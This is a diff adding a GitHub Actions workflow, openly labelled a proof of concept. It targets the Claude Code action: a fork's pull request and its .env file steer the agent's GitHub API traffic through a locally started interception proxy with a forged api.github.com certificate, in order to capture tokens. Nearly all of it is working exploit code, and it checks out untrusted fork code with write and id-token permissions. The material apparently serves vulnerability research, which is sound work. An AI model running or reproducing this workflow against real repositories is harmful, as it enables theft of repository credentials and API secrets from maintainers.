@@ -1,0 +1,77 @@
+name: PoC — fork PR .env MITM
+
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+  id-token: write
+
+jobs:
+  env-fork-poc:
+    if: |
+      github.event.issue.pull_request &&
+      contains(github.event.comment.body, '@claude')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: refs/pull/${{ github.event.issue.number }}/head
+          fetch-depth: 1
+
+      - name: Generate MITM TLS material
+        run: |
+          openssl req -x509 -newkey rsa:2048 \
+            -keyout /tmp/mitm.key -out /tmp/mitm.crt -days 1 -nodes \
+            -subj "/CN=api.github.com"
+          echo "MITM cert CN=api.github.com"
+
+      - name: Start localhost MITM proxy
+        env:
+          MITM_PORT: "18080"
+          MITM_CERT: /tmp/mitm.crt
+          MITM_KEY: /tmp/mitm.key
+          POC_A3_OUT: ${{ runner.temp }}/poc-a3-env.txt
+        run: |
+          node .poc/mitm-connect-proxy.mjs &
+          echo $! > /tmp/mitm.pid
+          sleep 2
+          curl -sS -o /dev/null -w "proxy_up=%{http_code}\n" http://127.0.0.1:18080/ || true
+
+      - uses: anthropics/claude-code-action@f87768c6d25f92ae6efa7175e223ef77d4cbf97f
+        with:
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+
+      - name: MCP-equivalent bun spawn probe (.env MITM)
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+          REPO_OWNER: ${{ github.repository_owner }}
+          REPO_NAME: ${{ github.event.repository.name }}
+        run: |
+          echo "=== POC-A3_PROBE ==="
+          test -f .env && echo "attacker_env=present" || echo "attacker_env=absent"
+          bun run .poc/probe-github-fetch.ts
+
+      - name: Collect MITM proof
+        if: always()
+        run: |
+          echo "=== ENV_FORK_COLLECTOR ==="
+          MARKER="${RUNNER_TEMP}/poc-a3-env.txt"
+          if [ -f "$MARKER" ]; then
+            cat "$MARKER"
+          else
+            echo "POC-A3 marker=absent"
+          fi
+          if [ -f "${RUNNER_TEMP}/poc-a3-mitm.log" ]; then
+            echo "=== MITM_LOG_TAIL ==="
+            tail -n 20 "${RUNNER_TEMP}/poc-a3-mitm.log"
+          fi
+          grep -E "from a fork|Restoring \.claude|POC-A3|MITM_CAPTURE|probe_fetch" "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+
+      - name: Stop MITM proxy
+        if: always()
+        run: |
+          if [ -f /tmp/mitm.pid ]; then kill "$(cat /tmp/mitm.pid)" 2>/dev/null || true; fi
